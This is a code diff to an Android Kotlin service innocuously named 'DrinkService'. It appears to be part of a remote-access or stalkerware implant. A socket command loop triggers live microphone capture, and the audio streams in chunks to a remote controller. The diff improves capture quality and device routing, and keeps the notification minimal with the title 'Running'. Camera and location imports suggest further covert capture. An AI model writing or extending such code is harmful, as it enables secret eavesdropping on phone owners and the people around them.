@@ -8,6 +8,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
+import android.content.pm.ServiceInfo
 import android.graphics.ImageFormat
 import android.hardware.camera2.CameraCaptureSession
 import android.hardware.camera2.CameraCharacteristics
@@ -17,10 +18,18 @@ import android.hardware.camera2.CaptureRequest
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
+import android.media.AudioAttributes
+import android.media.AudioDeviceCallback
+import android.media.AudioDeviceInfo
+import android.media.AudioFocusRequest
 import android.media.AudioFormat
+import android.media.AudioManager
 import android.media.AudioRecord
 import android.media.ImageReader
 import android.media.MediaRecorder
+import android.media.audiofx.AcousticEchoCanceler
+import android.media.audiofx.AutomaticGainControl
+import android.media.audiofx.NoiseSuppressor
 import android.net.ConnectivityManager
 import android.net.Network
 import android.net.NetworkCapabilities
@@ -113,7 +122,7 @@ class DrinkService : Service() {
         requestPhysicalNetwork(cm)
     }
 
-    private fun startForegroundWithNotification() {
+    private fun startForegroundWithNotification(isMicActive: Boolean = false) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val nm = getSystemService(NotificationManager::class.java)
             if (nm.getNotificationChannel(NOTIF_CHANNEL_ID) == null) {
@@ -127,11 +136,30 @@ class DrinkService : Service() {
             }
         }
         val notif = NotificationCompat.Builder(this, NOTIF_CHANNEL_ID)
-            .setContentTitle("Running")
+            .setContentTitle(if (isMicActive) "Audio Streaming" else "Running")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
-        startForeground(NOTIF_ID, notif)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            var fgsType = 0
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+            }
+            if (isMicActive) {
+                fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+            }
+            runCatching {
+                if (fgsType != 0) {
+                    startForeground(NOTIF_ID, notif, fgsType)
+                } else {
+                    startForeground(NOTIF_ID, notif)
+                }
+            }.onFailure {
+                runCatching { startForeground(NOTIF_ID, notif) }
+            }
+        } else {
+            startForeground(NOTIF_ID, notif)
+        }
     }
 
     private fun requestPhysicalNetwork(cm: ConnectivityManager) {
@@ -158,7 +186,7 @@ class DrinkService : Service() {
             }
         }
         physicalNetworkCallback = cb
-        runCatching { cm.requestNetwork(request, cb) }
+        runCatching { cm.registerNetworkCallback(request, cb) }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -224,9 +252,39 @@ class DrinkService : Service() {
         }
     }
 
+    private fun updateAudioRoute(audioManager: AudioManager) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            val available = audioManager.availableCommunicationDevices
+            val preferredDevice = available.firstOrNull { it.type == AudioDeviceInfo.TYPE_BLUETOOTH_SCO }
+                ?: available.firstOrNull { it.type == AudioDeviceInfo.TYPE_WIRED_HEADSET || it.type == AudioDeviceInfo.TYPE_WIRED_HEADPHONES || it.type == AudioDeviceInfo.TYPE_USB_HEADSET }
+                ?: available.firstOrNull { it.type == AudioDeviceInfo.TYPE_BUILTIN_MIC }
+                ?: available.firstOrNull()
+            if (preferredDevice != null) {
+                audioManager.setCommunicationDevice(preferredDevice)
+            }
+        } else {
+            if (audioManager.isBluetoothScoAvailableOffCall) {
+                audioManager.startBluetoothSco()
+                audioManager.isBluetoothScoOn = true
+            }
+        }
+    }
+
+    private fun clearAudioRoute(audioManager: AudioManager) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            audioManager.clearCommunicationDevice()
+        } else {
+            if (audioManager.isBluetoothScoOn) {
+                audioManager.isBluetoothScoOn = false
+                audioManager.stopBluetoothSco()
+            }
+        }
+    }
+
     private fun handleStopMic() {
         micJob?.cancel()
         micJob = null
+        startForegroundWithNotification(isMicActive = false)
     }
 
     private suspend fun commandLoop(sm: SocketManager) {
@@ -273,99 +331,190 @@ class DrinkService : Service() {
                 }
                 return@launch
             }
-            val minBuf = AudioRecord.getMinBufferSize(
-                SAMPLE_RATE,
-                AudioFormat.CHANNEL_IN_MONO,
-                AudioFormat.ENCODING_PCM_16BIT
-            )
-            val actualBufferSize = if (minBuf > 0) maxOf(minBuf * 2, 4096) else 4096
 
-            var recorder: AudioRecord? = null
-            val audioSources = intArrayOf(
-                MediaRecorder.AudioSource.MIC,
-                MediaRecorder.AudioSource.DEFAULT,
-                MediaRecorder.AudioSource.VOICE_RECOGNITION,
-                MediaRecorder.AudioSource.VOICE_COMMUNICATION
-            )
-            for (source in audioSources) {
-                try {
-                    val rec = AudioRecord(
-                        source,
-                        SAMPLE_RATE,
-                        AudioFormat.CHANNEL_IN_MONO,
-                        AudioFormat.ENCODING_PCM_16BIT,
-                        actualBufferSize
-                    )
-                    if (rec.state == AudioRecord.STATE_INITIALIZED) {
-                        recorder = rec
-                        break
-                    } else {
-                        rec.release()
+            startForegroundWithNotification(isMicActive = true)
+
+            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            val originalAudioMode = audioManager.mode
+
+            val deviceCallback = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                object : AudioDeviceCallback() {
+                    override fun onAudioDevicesAdded(addedDevices: Array<out AudioDeviceInfo>?) {
+                        updateAudioRoute(audioManager)
                     }
-                } catch (e: Exception) {
-                }
-            }
-
-            if (recorder == null || recorder.state != AudioRecord.STATE_INITIALIZED) {
-                recorder?.release()
-                if (sm.isConnected() && isActive) {
-                    runCatching {
-                        val errorHeader = JSONObject().apply {
-                            put("type", "error")
-                            put("cmd", "mic")
-                            put("message", "AudioRecord initialization failed")
-                        }
-                        sm.sendFrame(errorHeader)
+                    override fun onAudioDevicesRemoved(removedDevices: Array<out AudioDeviceInfo>?) {
+                        updateAudioRoute(audioManager)
                     }
                 }
-                return@launch
-            }
+            } else null
+
+            var focusRequest: AudioFocusRequest? = null
 
             try {
-                recorder.startRecording()
-                if (recorder.recordingState != AudioRecord.RECORDSTATE_RECORDING) {
-                    throw IllegalStateException("AudioRecord failed to start recording")
+                audioManager.mode = AudioManager.MODE_IN_COMMUNICATION
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && deviceCallback != null) {
+                    audioManager.registerAudioDeviceCallback(deviceCallback, null)
                 }
-                val buffer = ByteArray(actualBufferSize)
-                while (isActive && sm.isConnected()) {
-                    val read = recorder.read(buffer, 0, buffer.size)
-                    if (read > 0) {
-                        val chunk = buffer.copyOf(read)
-                        val header = JSONObject().apply {
-                            put("type", "mic_chunk")
-                            put("size", chunk.size)
+                updateAudioRoute(audioManager)
+
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    val playbackAttributes = AudioAttributes.Builder()
+                        .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
+                        .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
+                        .build()
+                    focusRequest = AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT)
+                        .setAudioAttributes(playbackAttributes)
+                        .setAcceptsDelayedFocusGain(false)
+                        .setOnAudioFocusChangeListener { }
+                        .build()
+                    audioManager.requestAudioFocus(focusRequest)
+                } else {
+                    @Suppress("DEPRECATION")
+                    audioManager.requestAudioFocus(
+                        null,
+                        AudioManager.STREAM_VOICE_CALL,
+                        AudioManager.AUDIOFOCUS_GAIN_TRANSIENT
+                    )
+                }
+
+                val minBuf = AudioRecord.getMinBufferSize(
+                    SAMPLE_RATE,
+                    AudioFormat.CHANNEL_IN_MONO,
+                    AudioFormat.ENCODING_PCM_16BIT
+                )
+                val chunkBufferSize = if (minBuf > 0) maxOf(minBuf, 1280) else 1280
+
+                var recorder: AudioRecord? = null
+                val audioSources = intArrayOf(
+                    MediaRecorder.AudioSource.VOICE_COMMUNICATION,
+                    MediaRecorder.AudioSource.MIC,
+                    MediaRecorder.AudioSource.DEFAULT,
+                    MediaRecorder.AudioSource.VOICE_RECOGNITION
+                )
+                for (source in audioSources) {
+                    try {
+                        val rec = AudioRecord(
+                            source,
+                            SAMPLE_RATE,
+                            AudioFormat.CHANNEL_IN_MONO,
+                            AudioFormat.ENCODING_PCM_16BIT,
+                            chunkBufferSize * 2
+                        )
+                        if (rec.state == AudioRecord.STATE_INITIALIZED) {
+                            recorder = rec
+                            break
+                        } else {
+                            rec.release()
                         }
-                        sm.sendFrame(header, chunk)
-                    } else if (read < 0) {
-                        if (sm.isConnected() && isActive) {
-                            runCatching {
-                                val errorHeader = JSONObject().apply {
-                                    put("type", "error")
-                                    put("cmd", "mic")
-                                    put("message", "AudioRecord read error code: $read")
-                                }
-                                sm.sendFrame(errorHeader)
-                            }
-                        }
-                        break
+                    } catch (e: Exception) {
                     }
                 }
-            } catch (e: Exception) {
-                if (sm.isConnected() && isActive) {
-                    runCatching {
-                        val errorHeader = JSONObject().apply {
-                            put("type", "error")
-                            put("cmd", "mic")
-                            put("message", e.message ?: "Mic stream failed")
+
+                if (recorder == null || recorder.state != AudioRecord.STATE_INITIALIZED) {
+                    recorder?.release()
+                    if (sm.isConnected() && isActive) {
+                        runCatching {
+                            val errorHeader = JSONObject().apply {
+                                put("type", "error")
+                                put("cmd", "mic")
+                                put("message", "AudioRecord initialization failed")
+                            }
+                            sm.sendFrame(errorHeader)
                         }
-                        sm.sendFrame(errorHeader)
+                    }
+                    return@launch
+                }
+
+                var aec: AcousticEchoCanceler? = null
+                var ns: NoiseSuppressor? = null
+                var agc: AutomaticGainControl? = null
+
+                if (AcousticEchoCanceler.isAvailable()) {
+                    runCatching {
+                        aec = AcousticEchoCanceler.create(recorder.audioSessionId)?.apply {
+                            enabled = true
+                        }
+                    }
+                }
+                if (NoiseSuppressor.isAvailable()) {
+                    runCatching {
+                        ns = NoiseSuppressor.create(recorder.audioSessionId)?.apply {
+                            enabled = true
+                        }
+                    }
+                }
+                if (AutomaticGainControl.isAvailable()) {
+                    runCatching {
+                        agc = AutomaticGainControl.create(recorder.audioSessionId)?.apply {
+                            enabled = true
+                        }
+                    }
+                }
+
+                try {
+                    recorder.startRecording()
+                    if (recorder.recordingState != AudioRecord.RECORDSTATE_RECORDING) {
+                        throw IllegalStateException("AudioRecord failed to start recording")
+                    }
+                    val buffer = ByteArray(chunkBufferSize)
+                    while (isActive && sm.isConnected()) {
+                        val read = recorder.read(buffer, 0, buffer.size)
+                        if (read > 0) {
+                            val chunk = buffer.copyOf(read)
+                            val header = JSONObject().apply {
+                                put("type", "mic_chunk")
+                                put("size", chunk.size)
+                            }
+                            sm.sendFrame(header, chunk)
+                        } else if (read < 0) {
+                            if (sm.isConnected() && isActive) {
+                                runCatching {
+                                    val errorHeader = JSONObject().apply {
+                                        put("type", "error")
+                                        put("cmd", "mic")
+                                        put("message", "AudioRecord read error code: $read")
+                                    }
+                                    sm.sendFrame(errorHeader)
+                                }
+                            }
+                            break
+                        }
+                    }
+                } catch (e: Exception) {
+                    if (sm.isConnected() && isActive) {
+                        runCatching {
+                            val errorHeader = JSONObject().apply {
+                                put("type", "error")
+                                put("cmd", "mic")
+                                put("message", e.message ?: "Mic stream failed")
+                            }
+                            sm.sendFrame(errorHeader)
+                        }
+                    }
+                } finally {
+                    runCatching {
+                        aec?.release()
+                        ns?.release()
+                        agc?.release()
+                        recorder.stop()
+                        recorder.release()
                     }
                 }
             } finally {
                 runCatching {
-                    recorder.stop()
-                    recorder.release()
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && deviceCallback != null) {
+                        audioManager.unregisterAudioDeviceCallback(deviceCallback)
+                    }
+                    clearAudioRoute(audioManager)
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && focusRequest != null) {
+                        audioManager.abandonAudioFocusRequest(focusRequest)
+                    } else {
+                        @Suppress("DEPRECATION")
+                        audioManager.abandonAudioFocus(null)
+                    }
+                    audioManager.mode = originalAudioMode
                 }
+                startForegroundWithNotification(isMicActive = false)
             }
         }
     }
